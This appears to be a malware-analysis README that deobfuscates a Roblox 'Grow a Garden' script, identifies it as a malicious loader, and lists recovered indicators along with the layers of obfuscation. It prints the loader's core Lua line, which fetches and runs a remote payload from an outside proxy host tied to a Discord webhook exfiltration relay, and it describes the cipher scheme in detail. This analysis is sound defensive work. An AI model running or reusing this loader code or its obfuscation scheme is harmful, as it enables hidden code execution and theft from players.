# ezvbs / gag-scripts — `Qw#%$r`

Deobfuscation of `https://raw.githubusercontent.com/ezvbs/gag-scripts/refs/heads/main/Qw%23%25%24r`
(a Roblox **Grow a Garden** script).

| File | Description |
|------|-------------|
| `Qwr.lua` | Original obfuscated source, verbatim. |
| `Qwr.reconstructed.lua` | Readable reconstruction + the working string decryptor. |

## ⚠️ Verdict: malicious loader

This is **not** a game script — it is an **anti-tamper loader**. After anti-hook
checks it downloads and runs a remote second stage, exposing a webhook id and a
username for that stage to exfiltrate with (Discord relay via a proxy host).

### Recovered indicators (decrypted from the embedded blobs)

```
Payload URL : https://proxy-zdus.vercel.app/uploads/obfuscated.lua
Relay host  : proxy-zdus.vercel.app      (serves payload + relays the webhook)
Webhook id  : 6b7802b3eed939ddf1a417f5587c9aa1
Username    : guton27
```

### Net behaviour

```lua
-- anti-tamper checks, else error("Tamper Detected!")
_G.Username = "guton27"
_G.Webhook  = "6b7802b3eed939ddf1a417f5587c9aa1"
_G.Proxy    = "https://proxy-zdus.vercel.app"
loadstring(game:HttpGet(_G.Proxy .. "/uploads/obfuscated.lua"))()
```

## Obfuscation layers (outer → inner)

1. **String table** of custom-base64 blobs written as decimal `\ddd` escapes.
   Alphabet: `XVL4nKCpzUZbxB2Iv/1tu+P3wQi8AyrfWGlkhDNgOEHTJFR6j7cdaMqSe9msY5o0`
2. **Array-reversal shuffle** that re-orders the table (reverse 1‑53, 1‑36, 37‑53).
3. **Custom-base64 decode** of every entry → 53 constants (libraries, metamethods,
   `Webhook`/`Username`/`Tamper Detected!`, plus 4 still-encrypted blobs + decoys).
4. **Per-constant stream cipher** for the 4 sensitive blobs: a 45-bit LCG
   (`state = (state*129 + 19978650077357) mod 2^45`) + a `*101 mod 257` companion
   + a 32-bit rotate, additively chained into the ciphertext (carry seed `174`).
   Reconstructed and re-implemented in `Qwr.reconstructed.lua`.
5. **Control-flow flattening**: the program is one numeric state-machine VM
   (~64 handler states / 9 nested "functions"); all integer literals are split
   into arithmetic (`747062-584218` = `162820`) to defeat searching.

## How it was recovered (fully static — the sample was never executed)

* Re-implemented the base64 decoder + reversal shuffle in Python → all 53 constants.
* Constant-folded every arithmetic expression and inlined `X(n)` string lookups.
* Parsed the binary-search dispatch tree into 72 leaf handlers, resolved each
  handler's final `u = …` jump via light symbolic propagation, and rebuilt the CFG
  (entry `162820`, 8 nested-function entries).
* Read the recovered control flow to identify the cipher, then re-implemented the
  cipher in Python to decrypt the 4 blobs — yielding the IOCs above.
